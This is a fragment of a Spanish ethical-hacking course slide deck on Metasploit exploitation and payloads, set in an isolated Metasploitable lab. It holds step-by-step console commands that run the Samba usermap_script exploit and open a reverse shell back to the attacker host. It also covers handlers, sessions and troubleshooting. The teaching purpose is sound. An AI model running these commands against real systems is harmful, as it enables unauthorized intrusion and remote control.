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073 — Metasploit: explotación y payloads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="2E8B57"/>
                </a:solidFill>
              </a:rPr>
              <a:t>parte 3 hacking etico y pentesting metodologia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ejecutará el ciclo completo de explotación con Metasploit sobre un laboratorio propio: seleccionar un exploit acorde a una vulnerabilidad enumerada, elegir y configurar el payload adecuado…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Emparejar una vulnerabilidad enumerada previamente con un exploit compatible de Metasploit.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payloads bind y reverse, y staged y stageless, explicando cuándo conviene cada combinación.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Configurar correctamente LHOST, LPORT, RHOSTS y el target de un módulo antes de lanzarlo.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un exploit contra Metasploitable2/3 y gestionar la sesión resultante con sessions.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Diagnosticar por qué un exploit falla (target incorrecto, firewall, payload incompatible) y corregirlo.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Justificar por escrito, para cada acción de explotación, que se realiza dentro de un alcance autorizado.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Emparejar exploit y vulnerabilidad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Reverse shell vs. bind shell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Payload staged vs. stageless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check antes de exploit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Selección de target (set target)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Handlers y exploit -j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Gestión de sesiones múltiples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explotación empieza por una decisión que parece obvia y que se falla constantemente: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exploit tiene que coincidir con la vulnerabilidad exacta del objetivo, no solo con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servicio. La versión, la arquitectura (x86/x64), el idioma del sistema y hasta el nivel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parche cambian los offsets de memoria de los que depende un exploit; lanzar uno que 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corresponde no solo falla, sino que puede tumbar el servicio —un intento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desbordamiento mal ajustado cierra el proceso—, lo que en un pentest es un incidente que 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factura en confianza.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Reverse shell: conexión donde la máquina víctima se conecta hacia el atacante. Característica clave: atraviesa firewalls que permiten tráfico saliente pero bloquean el entrante, el escenario más…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Bind shell: conexión donde el atacante se conecta a un puerto abierto por la víctima. Característica clave: falla si existe un firewall de entrada entre atacante y víctima.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Payload staged: payload identificado con / en su nombre (ej. windows/meterpreter/reversetcp) que envía primero un stager pequeño y luego descarga el resto. Característica clave: menor tamaño inicial…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Payload stageless: payload identificado con  (ej. windows/meterpreterreversetcp) que se envía completo en un solo bloque. Característica clave: más fiable en redes inestables o con filtrado agresivo…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Handler (exploit/multi/handler): módulo genérico que escucha la conexión que hará el payload una vez ejecutado en la víctima. Característica clave: debe configurarse con el mismo tipo de payload…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check: comando de Metasploit que verifica si el objetivo es vulnerable sin lanzar la explotación completa. Característica clave: no todos los módulos lo implementan, pero cuando existe reduce el…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Emparejamiento exploit-vulnerabilidad — El exploit debe coincidir con la versión y arquitectura exactas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check — Verifica la condición vulnerable sin ejecutar el ataque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Target — Variante del exploit según sistema, versión y arquitectura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Reverse shell — El objetivo conecta hacia el atacante; atraviesa NAT/firewall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Bind shell — El objetivo abre un puerto; el atacante se conecta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LHOST / LPORT — Dirección y puerto de escucha del atacante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Metasploit Framework y Metasploitable2/3 desplegadas en la misma red interna aislada (host-only) que en la clase anterior.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Confirmar la IP de la máquina atacante (ip a en Kali) antes de configurar LHOST — un error aquí es la causa número uno de exploits fallidos.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Workspace de Metasploit ya poblado con hosts y servicios desde la clase 072 (dbnmap, hosts, services).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Objetivo 192.168.56.101 (Metasploitable2), atacante Kali 192.168.56.10 (ajustar según tu red de laboratorio).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Selecciona un exploit conocido y documentado de Metasploitable2, por ejemplo el de Samba: use exploit/multi/samba/usermapscript.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Fija el objetivo: set RHOSTS 192.168.56.101.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Lista los payloads compatibles con el exploit seleccionado: show payloads.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Elige un payload reverse y configúralo: set PAYLOAD cmd/unix/reverse, set LHOST 192.168.56.10, set LPORT 4444.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todas las opciones antes de disparar: options.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el módulo lo soporta, verifica sin explotar: check.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con un ejemplo concreto en qué escenario un reverse shell es imprescindible frente a un bind shell.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Cambia un payload staged por su equivalente stageless en show payloads y describe la diferencia visible en el nombre y el tamaño.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Provoca un fallo de explotación poniendo un LHOST incorrecto y documenta el síntoma exacto observado en consola.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check en un módulo que lo soporte y en uno que no lo soporte; documenta la diferencia de comportamiento.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Obtén dos sesiones simultáneas contra el mismo objetivo (usando dos exploits distintos) y practica moverte entre ellas con sessions -i.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el handler debe coincidir exactamente con el payload usado en el exploit, incluyendo arquitectura y formato.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y documenta, desde la perspectiva defensiva, qué patrón de tráfico de red generaría un IDS/IPS al detectar una conexión reverse shell hacia un puerto no estándar como el 4444.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Reto: Obtener una sesión interactiva en la VM de laboratorio mediante un exploit real de Metasploit y demostrar ejecución de comandos en el sistema comprometido.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sessions -l muestra al menos una sesión activa contra el objetivo de laboratorio; se ejecuta id (o equivalente) mostrando el usuario obtenido en la víctima; y se documenta por…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"Exploit completed, but no session was created" — Payload o target incorrecto, o firewall bloqueando la conexión de vuelta; probar otro payload o ajustar set target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handler no recibe nunca la conexión — LHOST apunta a 127.0.0.1 en vez de la IP real de la interfaz de laboratorio; corregir con ip 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"The target is not exploitable" tras check — La versión del servicio no es vulnerable; verificar con services y elegir otro módulo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sesión se cae inmediatamente tras conectar — Payload staged inestable en la red de laboratorio; probar la variante stageless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Puerto LPORT ya en uso — Otro handler o proceso ocupa el puerto; cambiar LPORT o finalizar el job anterior con jobs -K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exploit tarda mucho o se queda colgado — Timeout de red o objetivo caído; verificar conectividad con ping/nmap antes de reintentar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set target con índice fuera de rango — El módulo tiene menos targets de los esperados; revisar show targets antes de fijar el índice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aparece "Exploit completed, but no session was created" tan seguido?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Suele deberse a incompatibilidad de payload/target, un firewall bloqueando la conexión de vuelta, o un LHOST mal configurado. Revisar options, probar un payload distinto y confirmar la IP de escucha…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¿Debo elegir staged o stageless por defecto?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Depende de la calidad de la red. En redes de laboratorio estables, staged reduce el tamaño inicial transmitido. En redes con pérdida de paquetes o proxies intermedios, stageless suele ser más fiable…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¿Debo usar siempre reverse shells en vez de bind shells?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la mayoría de escenarios reales sí, porque los firewalls corporativos permiten tráfico saliente pero bloquean el entrante no solicitado. Los bind shells solo son viables cuando puedes alcanzar…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comando check es siempre seguro de ejecutar?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Kennedy, D. et al. "Metasploit: The Penetration Tester's Guide" (No Starch Press) — capítulos sobre explotación y payloads.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Kim, P. "The Hacker Playbook 3" (2018) — metodología práctica de explotación en engagements reales.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Offensive Security, Metasploit Unleashed: &lt;https://www.offsec.com/metasploit-unleashed/&gt;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Rapid7, documentación oficial de Metasploit sobre payloads: &lt;https://docs.metasploit.com/docs/using-metasploit/basics/payload-types-in-metasploit.html&gt;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ATT&amp;CK, técnica T1210 (Exploitation of Remote Services): &lt;https://attack.mitre.org/techniques/T1210/&gt;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PTES (Penetration Testing Execution Standard), fase de Exploitation: &lt;http://www.pentest-standard.org&gt;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09a221757ad8d58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3894" y="1097280"/>
            <a:ext cx="2576211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